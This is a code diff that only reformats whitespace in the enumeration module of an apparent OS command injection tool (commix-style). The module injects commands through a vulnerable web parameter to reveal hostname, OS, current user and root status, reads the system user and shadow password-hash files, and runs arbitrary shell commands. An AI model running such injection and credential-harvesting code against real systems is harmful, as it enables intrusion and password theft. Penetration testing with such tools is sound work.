@@ -26,13 +26,13 @@ from src.core.injections.semiblind_based.techniques.file_based import fb_injecto
  The "file-based" technique on Semiblind-based OS Command Injection.
 """
 
-def do_check(separator,payload,TAG,delay,prefix,suffix,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE,alter_shell):
+def do_check(separator, payload, TAG, delay, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell):
 
   # Hostname enumeration
   if menu.options.hostname:
     cmd = settings.HOSTNAME
-    response = fb_injector.injection(separator,payload,TAG,cmd,prefix,suffix,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE,alter_shell)
-    shell = fb_injector.injection_results(url,OUTPUT_TEXTFILE,delay)
+    response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
+    shell = fb_injector.injection_results(url, OUTPUT_TEXTFILE, delay)
     if shell:
       if menu.options.verbose:
         print ""
@@ -45,14 +45,14 @@ def do_check(separator,payload,TAG,delay,prefix,suffix,http_request_method,url,v
   # "Retrieve certain system information (operating system, hardware platform)
   if menu.options.sys_info:
     cmd = settings.RECOGNISE_OS            
-    response = fb_injector.injection(separator,payload,TAG,cmd,prefix,suffix,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE,alter_shell)
-    target_os = fb_injector.injection_results(url,OUTPUT_TEXTFILE,delay)
+    response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
+    target_os = fb_injector.injection_results(url, OUTPUT_TEXTFILE, delay)
     if target_os:
       target_os = "".join(str(p) for p in target_os)
       if target_os == "Linux":
         cmd = settings.RECOGNISE_HP
-        response = fb_injector.injection(separator,payload,TAG,cmd,prefix,suffix,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE,alter_shell)
-        target_arch = fb_injector.injection_results(url,OUTPUT_TEXTFILE,delay)
+        response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
+        target_arch = fb_injector.injection_results(url, OUTPUT_TEXTFILE, delay)
         if target_arch:
           target_arch = "".join(str(p) for p in target_arch)
           sys.stdout.write(Style.BRIGHT + "(!) The target operating system is " + Style.UNDERLINE + target_os + Style.RESET_ALL)
@@ -65,15 +65,15 @@ def do_check(separator,payload,TAG,delay,prefix,suffix,http_request_method,url,v
   # The current user enumeration
   if menu.options.current_user:
     cmd = settings.CURRENT_USER
-    response = fb_injector.injection(separator,payload,TAG,cmd,prefix,suffix,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE,alter_shell)
-    cu_account = fb_injector.injection_results(url,OUTPUT_TEXTFILE,delay)
+    response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
+    cu_account = fb_injector.injection_results(url, OUTPUT_TEXTFILE, delay)
     if cu_account:
       cu_account = "".join(str(p) for p in cu_account)
       # Check if the user have super privileges.
       if menu.options.is_root:
         cmd = settings.ISROOT
-        response = fb_injector.injection(separator,payload,TAG,cmd,prefix,suffix,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE,alter_shell)
-        shell = fb_injector.injection_results(url,OUTPUT_TEXTFILE,delay)
+        response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
+        shell = fb_injector.injection_results(url, OUTPUT_TEXTFILE, delay)
         if shell:
           shell = "".join(str(p) for p in shell)
           sys.stdout.write(Style.BRIGHT + "(!) The current user is " + Style.UNDERLINE + cu_account + Style.RESET_ALL)
@@ -90,11 +90,11 @@ def do_check(separator,payload,TAG,delay,prefix,suffix,http_request_method,url,v
   # System users enumeration
   if menu.options.users:
     cmd = settings.SYS_USERS             
-    response = fb_injector.injection(separator,payload,TAG,cmd,prefix,suffix,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE,alter_shell)
-    sys_users = fb_injector.injection_results(url,OUTPUT_TEXTFILE,delay)
+    response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
+    sys_users = fb_injector.injection_results(url, OUTPUT_TEXTFILE, delay)
     if sys_users :
       sys_users = "".join(str(p) for p in sys_users)
-      sys_users = sys_users.replace("(@)","\n")
+      sys_users = sys_users.replace("(@)", "\n")
       sys_users = sys_users.split( )
       if len(sys_users) != 0 :
         sys.stdout.write("(*) Fetching '" + settings.PASSWD_FILE + "' to enumerate users entries... ")
@@ -129,11 +129,11 @@ def do_check(separator,payload,TAG,delay,prefix,suffix,http_request_method,url,v
   # System password enumeration
   if menu.options.passwords:
     cmd = settings.SYS_PASSES            
-    response = fb_injector.injection(separator,payload,TAG,cmd,prefix,suffix,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE,alter_shell)
-    sys_passes = fb_injector.injection_results(url,OUTPUT_TEXTFILE,delay)
+    response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
+    sys_passes = fb_injector.injection_results(url, OUTPUT_TEXTFILE, delay)
     if sys_passes :
       sys_passes = "".join(str(p) for p in sys_passes)
-      sys_passes = sys_passes.replace("(@)","\n")
+      sys_passes = sys_passes.replace("(@)", "\n")
       sys_passes = sys_passes.split( )
       if len(sys_passes) != 0 :
         sys.stdout.write("(*) Fetching '" + settings.SHADOW_FILE + "' to enumerate users password hashes... ")
@@ -153,8 +153,8 @@ def do_check(separator,payload,TAG,delay,prefix,suffix,http_request_method,url,v
   # Single os-shell execution
   if menu.options.os_cmd:
     cmd =  menu.options.os_cmd
-    response = fb_injector.injection(separator,payload,TAG,cmd,prefix,suffix,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE,alter_shell)
-    shell = fb_injector.injection_results(url,OUTPUT_TEXTFILE,delay)
+    response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
+    shell = fb_injector.injection_results(url, OUTPUT_TEXTFILE, delay)
     if shell:
       if menu.options.verbose:
         print ""
